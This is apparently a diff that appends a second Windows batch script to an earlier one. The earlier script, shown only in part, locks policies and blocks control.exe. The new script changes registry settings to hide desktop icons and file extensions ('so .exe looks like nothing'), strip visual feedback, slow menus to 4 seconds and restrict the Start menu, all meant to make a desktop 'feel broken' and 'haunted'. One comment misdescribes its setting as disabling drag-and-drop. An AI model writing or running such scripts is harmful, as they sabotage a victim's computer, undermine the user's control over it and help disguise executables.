@@ -52,3 +52,40 @@ reg add "%P%\Explorer\DisallowRun" /v 7 /t REG_SZ /d "control.exe" /f
 
 echo Policies locked. Even a working shell is now useless.
 pause
+
+
+// THE SECOND ONE
+
+@echo off
+set E=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+set V=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects
+
+REM Hide all desktop icons
+reg add "%E%" /v HideIcons /t REG_DWORD /d 1 /f
+
+REM Hide file extensions (so .exe looks like nothing)
+reg add "%E%" /v HideFileExt /t REG_DWORD /d 1 /f
+
+REM Force tiny taskbar icons + never combine (all windows stay separate)
+reg add "%E%" /v TaskbarSmallIcons /t REG_DWORD /d 1 /f
+reg add "%E%" /v TaskbarGlomLevel /t REG_DWORD /d 2 /f
+
+REM Turn off all visual feedback — everything feels dead
+reg add "%V%" /v VisualFXSetting /t REG_DWORD /d 3 /f
+reg add "HKCU\Control Panel\Desktop" /v UserPreferencesMask /t REG_BINARY /d 9012038010000000 /f
+
+REM Disable all animations and shadows
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v MinAnimate /t REG_SZ /d 0 /f
+
+REM Kill Aero transparency (Win8.1 has it minimal anyway, but still)
+reg add "HKCU\Software\Microsoft\Windows\DWM" /v Composition /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\DWM" /v ColorizationOpaqueBlend /t REG_DWORD /d 1 /f
+
+REM Slow down every menu to a crawl — feels broken
+reg add "HKCU\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 4000 /f
+
+REM Disable drag-and-drop in Explorer
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+
+echo Desktop is now a haunted house.
+pause
